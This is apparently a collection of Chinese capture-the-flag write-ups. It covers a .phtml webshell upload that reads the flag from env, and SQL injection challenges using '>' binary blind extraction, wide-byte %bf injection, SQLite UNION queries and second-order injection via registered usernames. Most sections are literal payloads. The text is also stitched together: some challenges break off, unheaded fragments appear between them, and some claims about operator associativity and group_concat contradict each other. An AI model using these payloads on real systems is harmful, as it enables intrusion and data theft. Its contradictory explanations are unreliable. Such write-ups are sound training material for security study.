EZFU_2

一、初始观察

打开题目页面，是一个很简洁的文件上传表单，只接受 image 字段，上传后返回文件路径。没有登录、没有验证码，看起来就是考上传绕过。

二、试探过滤规则

先拿不同类型的文件试了一圈，摸清楚后端的过滤逻辑。
test.php 直接被拦，返回 File type not allowed，说明有扩展名黑名单。test.php5 也被拦了，test.pHp 大小写混写同样没用，后端会先转小写再匹配。
正常的图片文件 test.jpg 和 test.png 都能上传成功。
试了 test.phtml，居然过了，既没被黑名单拦，也没被内容检测拦。另外 .htaccess 也能传上去。
再试 test.phar，这次是被内容检测拦下来的，返回 File content not allowed。说明后端除了黑名单之外，还会扫描文件内容里有没有 [?php 之类的标记。

到这里就清楚了，后端有两层过滤。第一层是扩展名黑名单，拦了php、php3、php4、php5、phps、pht、jsp、jspx、asp、aspx、sh、py、pl、exe、bat、cmd 这些。第二层是内容检测，如果文件里出现 [?php 或 [?=，只有扩展名是 .phtml 的时候才放行。 所以 .phtml 就是突破口——不在黑名单里，内容检测也给它开了绿灯，而且 Apache 默认配置会把它当 PHP 解析。
三、拿到 Webshell

构造一句话木马，保存为 shell.phtml 上传。服务器返回了路径 uploads/96289496-024a-471d-8ad0-faeb1416d3a3.phtml。

直接浏览器访问这个地址，页面输出了 phpinfo 的内容，确认 .phtml 被当成 PHP 执行了。

四、找 Flag

用 webshell 执行命令找 flag。先翻了 /flag*、/root/、/var/www/html/ 这些常见位置，都没有。

然后直接读环境变量 env，输出里赫然写着 FLAG=flag{4327b3b7-cfac-46f7-8e6f-88810e9a2147}。

Flag 是通过 Docker 的 ENV 指令注入进容器的，不在文件系统里，所以用 find 搜文件名根本搜不到，必须用 env 或 printenv 才能看见。

五、复盘

这题核心考了两个点。

一个是扩展名黑名单不完整。.phtml 是 PHP 的合法扩展名，出题人的黑名单里漏掉了。做文件上传题要对各种web 语言的冷门扩展名心里有数，比如 .phtml、.pht、.phps、.phar 这些，黑名单很容易漏。
另一个是 flag 的藏法。Docker 容器里经常通过环境变量注入 flag，不是文件，用 find 搜不到。养成习惯进容器先 env 看一眼。

EZSQL_7(字符型 SQL 注入 - WAF 严格过滤关键词 + 大于号二分盲注)

访问靶机，页面是一个登录表单，GET 方法提交 username 和 password 两个参数 正常登录 admin / admin，返回 Login failed. 测试 admin'#，返回 Welcome admin，单引号和注释符可用 测试 admin' or '1'='1，返回 Illegal SQL injection.，存在 WAF 关键词过滤 逐一测试发现 WAF 过滤了几乎所有 SQL 关键词：select、union、from、where、and、or、length、ascii、hex、char、ord、regexp、rlike、if、case、sleep、benchmark、between、in、exists，以及 ( 括号 但 = 运算符和 > 运算符未被过滤，且 mid()、substr()、concat() 等函数可用 关键发现：= 因运算符优先级问题无法用于逐字符判断（'admin'=mid(secret,N,1)='X' 会被 MySQL 解析为 ('admin'=mid(...))='X'，永远返回相同结果）。但 > 运算符配合括号可以用于二分查找：

1

?username=admin'=(mid(secret,1,1)>'E')#&password=x

当 mid(secret,1,1) 的 ASCII 值大于 E 时返回 Welcome admin，否则返回 Login failed 编写二分查找脚本，对 secret 列逐字符提取。每次用 > 比较中间值，7 次比较即可确定一个字符（128 个 ASCII 值 → log₂128 ≈ 7 次请求/字符） 示例提取过程：

1

?username=admin'=(mid(secret,1,1)>'E')#&password=x

返回 Welcome admin → 第 1 个字符 > ‘E’

1

?username=admin'=(mid(secret,1,1)>'F')#&password=x

复盘：这题的 WAF 过滤极其严格，几乎封禁了所有 SQL 关键词和函数。突破口是 > 运算符未被过滤，配合括号实现二分盲注。核心技巧：

  1. = 因左结合优先级无法逐字符判断，必须用 > 做二分
  2. MySQL 默认 collation 下字符串比较是大小写不敏感的，所以 ‘f’ > ‘E’ 和 ‘f’ > ’e’ 都为真
  3. 每个字符只需 ~7 次请求（二分），42 个字符总共约 300 次请求即可提取完整 flag

访问靶机，页面是一个登录表单，GET 方法提交 username 和 password 两个参数 测试 admin'#，返回 Welcome admin，单引号和注释符可用 测试 admin')#，页面返回完整的 SQL 报错信息：SELECT * FROM flag WHERE name = 'admin')#' AND passwd = 'x'，直接泄露了：

  1. 报错回显泄露了完整的查询结构（表名、列名），大幅降低了信息收集难度
  2. WAF 过滤了 >、< 但遗漏了 >=，利用 >= 实现二分查找
  3. MySQL = 的右结合特性使得 admin'=(expr)# 可以构造布尔 oracle，flag 存储在 secret 列而非 passwd 列

1

EZSQL_15(字符型 SQL 注入 - 宽字节注入绕过 addslashes + UNION 联合查询注入)

访问靶机，页面是一个登录表单，GET 方法提交 username 和 password 两个参数 正常登录 admin / admin123，返回 Welcome admin 测试单引号注入 admin'#，返回 Login failed.，没有报错。尝试各种注入 payload（admin'--+-、admin' or '1'='1、admin'#）全部返回 Login failed.，说明后端对单引号做了转义处理（addslashes() 或 mysql_real_escape_string()） 关键发现：admin%bf' or 1=1-- - 返回 Welcome admin，说明存在宽字节注入（Wide-Byte Injection）。原理是 addslashes() 在单引号前添加反斜杠 \（%5c），而 %bf%5c 在 GBK 编码中是一个合法的双字节字符，反斜杠被"吃掉"，单引号 %27 逃逸出来 确定列数，依次测试 1~8 列：

1

?username=-1%bf%27 union select 1,2,3,4-- -&password=x

4 列时返回 Welcome 2，确认查询有 4 列，回显位在第 2 列 获取数据库名和版本：

1

?username=-1%bf%27 union select 1,database(),3,4-- -&password=x

数据库名为 user，版本为 MariaDB 10.4.13 枚举当前数据库的表：

1

?username=-1%bf%27 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()-- -&password=x

只有一张表：flag 查看 flag 表的列名（表名用十六进制 0x666c6167 绕过单引号转义）：

1

?username=-1%bf%27 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=0x666c6167-- -&password=x

四列：id、name、passwd、secret 直接 dump flag 表：

1

?username=-1%bf%27 union select 1,group_concat(id,0x3a,name,0x3a,passwd,0x3a,secret),3,4 from flag-- -&password=x

返回 1:admin:admin123:flag{6746fd7a-7c7e-4681-a63a-2aa67e5b3d80}，成功获得 flag

复盘：这题的核心是宽字节注入（Wide-Byte Injection）。后端使用 addslashes() 对单引号进行转义，但在 GBK 编码环境下，%bf%5c 构成一个合法的双字节字符，吞掉了转义用的反斜杠，使单引号逃逸。绕过方式是在注入的单引号前添加 %bf（或其他高字节如 %81~%fe）。防御时应使用 mysql_set_charset() 设置字符集而非 addslashes()，或统一使用参数化查询（Prepared Statements）

EZSQL_16(字符型 UNION 联合查询注入 - SQLite 数据库)

访问靶机，页面是一个登录表单，GET 方法提交 username 和 password 两个参数 正常登录 admin / admin，返回 Login failed. 测试单引号注入 admin'，页面返回 SQLite 报错信息：SQLite3::query(): Unable to prepare statement: 1, near "123": syntax error，确认：

  • 后端使用 SQLite3 数据库
  • 单引号可以触发 SQL 注入
  • 报错信息回显，可以利用

尝试注释绕过登录，SQLite 中 -- 是行注释符：

1

?username=admin'--&password=123

返回 Welcome admin，登录成功，密码校验被绕过。SQL 语句变为：

1

SELECT * FROM users WHERE username = 'admin'--' AND password = '...'

-- 注释掉了后续的密码检查部分

页面只显示 “Welcome admin”，没有直接给出 flag，需要用 UNION 注入从数据库中提取。确定列数，依次测试：

1

?username=-1' UNION SELECT 1,2,3,4--&password=123

4 列时返回 Welcome 2，确认查询有 4 列，回显位在第 2 列。注意 SQLite 的 UNION 注入列数不匹配时会直接报错（SELECTs to the left and right of UNION do not have the same number of result columns），这有助于快速定位列数

枚举数据库中的表，SQLite 没有 information_schema，使用 sqlite_master 系统表：

1

?username=-1' UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type='table'--&password=123

返回 flag，只有一张表

查看 flag 表的结构：

1

?username=-1' UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type='table' AND name='flag'--&password=123

返回 CREATE TABLE flag (id INTEGER, name TEXT, passwd TEXT, secret TEXT)，四列：id、name、passwd、secret

直接 dump secret 列：

1

?username=-1' UNION SELECT 1,secret,3,4 FROM flag--&password=123

返回 flag{507e1437-ec0d-432f-aa4c-dc7034a9ab82}，成功获得 flag

复盘：这题的核心特征是后端使用 SQLite3 而非 MySQL/MariaDB。与 MySQL 注入的主要区别：

  1. 系统表不同：SQLite 使用 sqlite_master（存储表名和建表语句），而非 information_schema.tables / information_schema.columns
  2. 注释符相同：-- 行注释在 SQLite 和 MySQL 中通用，但 SQLite 中 -- 后需要有空格才能正确注释（本题中 -- 后直接跟 & 即 URL 参数分隔符，相当于有隐含分隔）
  3. 列枚举方式不同：SQLite 无法从 information_schema 获取列名，但可以通过 sqlite_master 的 sql 字段直接读取 CREATE TABLE 语句获取完整表结构
  4. 没有 group_concat：SQLite 原生支持 group_concat() 函数，但本题通过 -1 使原始查询无结果，UNION 注入只返回一行即可

返回"查询成功"，确认 flag 第 1 个字符为 f

编写自动化脚本，对每个位置遍历 a-z0-9{}- 字符集，通过响应是"查询成功"还是"未找到"判断字符是否匹配：

1

?id=1' and substr((select flag from flag where id=1),N,1)='X'-- (空格)

其中 N 为位置，X 为当前测试的字符

逐字符提取全部 42 个字符，得到 flag{d35d3ee9-c8ac-4a56-9104-c7dc9d5af3fa}

复盘：这题的核心难点有三个：

  1. WAF 过滤函数组合：单独的函数名不被拦截，但函数嵌套调用（如 length(database())）会被过滤。绕过方式是将字符串提取函数放在 exists() 的子查询中，避免直接嵌套
  2. 1 列查询 + 无数据显示：原始查询只有 1 列，且页面不显示查询数据，只能通过布尔盲注逐字符提取
  3. 注释符格式：-- 后必须跟空格（-- ）才能正确注释，URL 中编码为 --+ 或 %20 均可

EZSQL_18(字符型 SQL 注入 - 二次注入（Second-Order Injection）- 注册存储 + 查询触发)

访问靶机，页面是一个"用户中心"，包含登录、注册、笔记功能 正常注册用户 testuser / test123，登录成功后看到"我的笔记"和"添加笔记"功能 测试登录接口的 SQL 注入，尝试各种 payload（单引号闭合、万能密码、注释符绕过等）均返回"用户名或密码错误"，登录接口无注入漏洞 测试注册接口，注册 admin'-- 用户成功，说明注册时未对用户名做转义或过滤，恶意 SQL 语句被直接存入数据库 用 admin'-- 用户名登录成功，页面显示"欢迎回来，admin’– “，说明登录查询中 -- 注释掉了密码校验部分，直接以该用户名登录 访问"我的笔记"页面，发现返回了一条不属于当前注册用户的笔记内容：flag{7b995369-7fd3-4c95-b2e4-7dcc3870c9bf}

漏洞原理分析：

注册时，用户名 admin'-- 被直接存入数据库，没有任何转义。登录时，查询语句变为：

1

SELECT * FROM users WHERE username = 'admin'-- ' AND password = '...'

-- 注释掉了密码校验，登录成功

查看笔记时，查询语句类似：

1

SELECT * FROM notes WHERE user_id = (SELECT id FROM users WHERE username = 'admin'-- ')

-- 注释掉了后续条件，查询变成了：

1

SELECT * FROM notes WHERE user_id = (SELECT id FROM users WHERE username = 'admin')

直接返回了 admin 用户的笔记，而 admin 的笔记中存储着 flag

关键 payload：

1
2
3

注册用户名: admin'-- 
登录用户名: admin'-- 
密码: 任意值

复盘：这题的核心是二次注入（Second-Order SQL Injection）。第一次操作（注册）时，恶意 SQL 代码被存入数据库；第二次操作（查看笔记）时，存储的恶意代码被取出并拼接到新的 SQL 查询中执行。与普通注入不同，二次注入的恶意代码经过了"存储-取出-执行"的过程，绕过了输入时的任何检查。防御时不仅要在输入时过滤，更要在从数据库取出数据用于拼接 SQL 时使用参数化查询或转义

EZSQL_19(字符型 SQL 注入 - 二次注入 + UNION 联合查询注入 - 注册存储 + 登录查询触发)

访问靶机，页面与 EZSQL_18 相同，是一个"用户中心”，包含登录和注册功能。登录后只有"我的笔记"页面，没有"添加笔记"功能 先尝试与 EZSQL_18 相同的二次注入思路，注册 admin'-- 用户并登录，访问笔记页面返回 Welcome admin. Your secret note is empty.，说明成功以 admin 身份查看笔记，但 admin 的笔记为空

关键发现：笔记页面存在报错回显。注册 x' union select 1,2,3-- 用户并登录后访问笔记，返回 查询异常：The used SELECT statements have a different number of columns，说明：

  • 笔记查询使用了 UNION，且后端 SELECT 语句的列数不是 3
  • 注册时用户名未做转义，恶意 SQL 被存入数据库
  • 登录后查看笔记时，存储的用户名被取出拼接到查询中执行（二次注入）

逐一测试列数，union select 1,2 时笔记页面显示 2，确认查询有 2 列，第 2 列回显在笔记中

利用二次注入 + UNION 提取数据。注册时将 UNION 注入写入用户名，登录后查看笔记触发注入：

1

注册用户名: x' union select 1,database()--

登录后查看笔记，返回 user，数据库名为 user

枚举表：

1

注册用户名: x' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--

返回 user_notes,users,flags，发现 flags 表

查看 flags 表结构：

1

注册用户名: x' union select 1,group_concat(column_name) from information_schema.columns where table_name='flags'--

返回 flag，只有一列

直接提取 flag：

1

注册用户名: x' union select 1,flag from flags--

登录后查看笔记，返回 flag{979453e8-c4b5-4d1d-a109-d3391024c346}，成功获得 flag

复盘：这题是 EZSQL_18 的进阶版。同样是二次注入，但 admin 的笔记为空，不能直接获取 flag。需要利用 UNION 联合查询注入，通过注册恶意用户名将 UNION 语句存入数据库，登录后查看笔记时触发注入，从 flags 表中提取数据。与 EZSQL_18 相比，这题多了两个关键点：

  1. 报错回显：列数不匹配时返回 MySQL 错误信息，帮助快速确定列数
  2. UNION 注入利用：需要将整个查询替换为 UNION SELECT 来读取任意表的数据，而非仅利用注释符截断
